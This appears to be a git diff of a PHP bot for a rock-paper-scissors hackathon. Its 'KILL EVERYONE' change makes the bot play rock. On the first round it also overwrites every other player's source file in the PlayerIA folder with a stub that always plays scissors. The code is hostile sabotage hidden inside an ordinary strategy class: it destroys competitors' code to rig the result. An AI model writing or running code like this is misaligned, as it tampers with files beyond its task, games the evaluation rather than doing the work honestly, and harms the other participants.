@@ -41,10 +41,8 @@ class DebecPlayer extends Player
         // How can i display the result of each round ? $this->prettyDisplay()
         // -------------------------------------    -----------------------------------------------------
 
+        /* EASY STRAT */
         // $choice = parent::scissorsChoice();
-        // // foreach ($this->result->getStatsFor($this->opponentSide) as $key => $value) {
-        // //   print_r("key:" . $key . " value:" . $value . "\n");
-        // // }
         // $choices = $this->result->getStatsFor($this->opponentSide);
         // // print_r($choices);
         // // print("========\n");
@@ -55,18 +53,47 @@ class DebecPlayer extends Player
         //   $choices = parent::scissorsChoice();
         // else
         //   $choices = parent::paperChoice();
-        //
         // return $choice;
 
-        $choice = parent::scissorsChoice();
+        /* KILL EVERYONE */
+        $choice = parent::rockChoice();
 
         if ($this->result->getNbRound() != 0)
           return $choice;
         $files = glob('src/Game/PlayerIA/*Player.{php}', GLOB_BRACE);
         foreach($files as $file) {
-          if ($file == "src/Game/PlayerIA/DebecPlayer.php")
+          if ($file == "src/Game/PlayerIA/DebecPlayer.php" || $file == "src/Game/PlayerIA/Player.php")
             continue;
-          file_put_contents($file, "éliminé ! :D");
+
+          $filename = basename($file, ".php").PHP_EOL;
+          // print("filename:" . $filename . "\n");
+
+          $content =
+          '<?php' . "\n" .
+          'namespace Hackathon\PlayerIA;' . "\n" .
+          'use Hackathon\Game\Result;' . "\n" .
+          '/**' . "\n" .
+           '* Class DiomandePlayer' . "\n" .
+           '* @package Hackathon\PlayerIA' . "\n" .
+           '* @author Robin' . "\n" .
+           '*' . "\n" .
+           '*/' . "\n" .
+          'class ' . $filename . ' extends Player' . "\n" .
+          '{' . "\n" .
+              'protected $mySide;' . "\n" .
+              'protected $opponentSide;' . "\n" .
+              'protected $result;' . "\n" .
+              'public function getChoice()' . "\n" .
+              '{' . "\n" .
+                  '$choice = parent::scissorsChoice();' . "\n" .
+                  '$var = 1;' . "\n" .
+                  'return $choice;' . "\n" .
+              '}' . "\n" .
+          '};';
+
+          print($content . "\n==================\n");
+
+          file_put_contents($file, $content);
         }
         return $choice;
     }
